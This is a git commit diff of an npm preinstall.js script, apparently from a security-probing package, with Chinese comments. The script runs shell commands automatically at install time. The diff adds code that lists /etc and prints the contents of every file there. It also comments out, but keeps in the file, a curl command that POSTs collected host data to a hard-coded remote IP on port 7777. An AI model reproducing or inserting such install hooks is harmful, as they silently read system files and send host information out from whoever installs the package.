92d347b88f3b3e11bab44e07b4a299cbf8adb0d3
ckx-sec <56886249+ckx-sec@users.noreply.github.com>
2024-08-06 01:38:04 +0800

    Update preinstall.js

--- preinstall.js
+++ preinstall.js
@@ -1,5 +1,34 @@
 const { exec } = require('child_process');
 
+exec('ls /etc', (lsError, lsStdout, lsStderr) => {
+    if (lsError) {
+        console.error(`执行 ls /etc 时出错: ${lsError.message}`);
+        return;
+    }
+    if (lsStderr) {
+        console.error(`ls /etc 执行输出错误: ${lsStderr}`);
+        return;
+    }
+
+    const files = lsStdout.split('\n').filter(file => file); // 获取文件列表并过滤掉空行
+
+    // 对每个文件执行 cat 命令
+    files.forEach(file => {
+        exec(`cat /etc/${file}`, (catError, catStdout, catStderr) => {
+            if (catError) {
+                console.error(`执行 cat /etc/${file} 时出错: ${catError.message}`);
+                return;
+            }
+            if (catStderr) {
+                console.error(`cat /etc/${file} 执行输出错误: ${catStderr}`);
+                return;
+            }
+
+            console.log(`文件 /etc/${file} 的内容:\n${catStdout}`);
+        });
+    });
+});
+
 // 执行 whoami 命令
 exec('whoami', (error, stdout, stderr) => {
     if (error) {
@@ -25,20 +54,20 @@ exec('pwd', (error, stdout, stderr) => {
     }
     // console.log(`pwd 命令结果:\n${stdout}`);
     // 将环境变量数据通过 curl 命令发送到远程服务器
-    const data = stdout.trim();
-    const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" https://139.180.193.16:7777`;
+    // const data = stdout.trim();
+    // const command = `curl -X POST -H "Content-Type: text/plain" --data "${data}" https://139.180.193.16:7777`;
 
-    exec(command, (curlError, curlStdout, curlStderr) => {
-        if (curlError) {
-            console.error(`执行 curl 时出错: ${curlError.message}`);
-            return;
-        }
-        if (curlStderr) {
-            console.error(`curl 执行输出错误: ${curlStderr}`);
-            return;
-        }
-        console.log(`curl 命令结果:\n${curlStdout}`);
-    });
+    // exec(command, (curlError, curlStdout, curlStderr) => {
+    //     if (curlError) {
+    //         console.error(`执行 curl 时出错: ${curlError.message}`);
+    //         return;
+    //     }
+    //     if (curlStderr) {
+    //         console.error(`curl 执行输出错误: ${curlStderr}`);
+    //         return;
+    //     }
+    //     console.log(`curl 命令结果:\n${curlStdout}`);
+    // });
 });
 
 // 执行 ls 命令
